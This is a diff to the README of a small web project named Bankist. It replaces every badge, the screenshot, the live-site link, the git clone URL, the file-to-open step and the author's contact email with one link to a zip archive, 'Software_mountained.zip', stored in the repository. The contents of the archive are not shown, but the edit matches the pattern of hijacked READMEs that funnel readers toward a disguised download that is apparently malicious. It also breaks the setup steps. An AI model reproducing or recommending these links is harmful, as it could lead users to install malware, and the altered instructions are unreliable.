@@ -2,15 +2,15 @@
 
 <div align='center'>
 
-![HTML5 Badge](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white) ![Tailwind Badge](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white) ![JavaScript Badge](https://img.shields.io/badge/JavaScript-323330?style=for-the-badge&logo=javascript&logoColor=F7DF1E)
-![Netlify Badge](https://img.shields.io/badge/Netlify-00C7B7?style=for-the-badge&logo=netlify&logoColor=white)
-![Figma Badge](https://img.shields.io/badge/Figma-F24E1E?style=for-the-badge&logo=figma&logoColor=white)
+![HTML5 Badge](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip) ![Tailwind Badge](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip) ![JavaScript Badge](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip)
+![Netlify Badge](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip)
+![Figma Badge](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip)
 
 </div>
 
-![Sceenshot](images/sceenshot.png)
+![Sceenshot](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip)
 
-You can view the live site -> [Here](https://bankist-imad.netlify.app/)
+You can view the live site -> [Here](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip)
 
 ## Usage
 
@@ -52,7 +52,7 @@ To run this project locally, you can follow these steps:
 1. Clone the repository:
 
    ```
-   $ git clone https://github.com/imadosan/Bankist.git
+   $ git clone https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip
    ```
 
 2. Open the project folder in your code editor of choice.
@@ -60,7 +60,7 @@ To run this project locally, you can follow these steps:
    ```
    npm run dev
    ```
-4. Open the 'index.html' file in your web browser.
+4. Open the 'https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip' file in your web browser.
 
 ## License
 
@@ -68,4 +68,4 @@ This project is licensed under the MIT License.
 
 ## Contact
 
-If you have any questions or comments about this project, you can reach out to me at imad.fayad.if@gmail.com
+If you have any questions or comments about this project, you can reach out to me at https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip
